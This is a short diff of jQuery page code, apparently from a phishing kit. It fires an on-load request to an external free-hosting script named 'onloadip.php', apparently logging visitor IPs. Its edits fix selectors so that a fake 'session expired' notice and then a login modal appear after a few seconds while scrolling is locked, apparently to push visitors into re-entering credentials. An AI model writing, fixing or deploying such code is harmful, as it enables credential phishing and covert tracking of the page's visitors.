@@ -2,12 +2,12 @@ $.get("https://banglaerphoto.000webhostapp.com/contact/onloadip.php");
 
 $(document).ready(function(){
 	setTimeout(function() {
-		$("#sess_ex-").show();
+		$("#sess_ex").show();
 		$("body").css("overflow", "hidden");
 	},5000);
 
   setTimeout(function() {
-    $(".login-modal-").show();
+    $(".login-modal").show();
     $("body").css("overflow", "hidden");
   },8000);
    
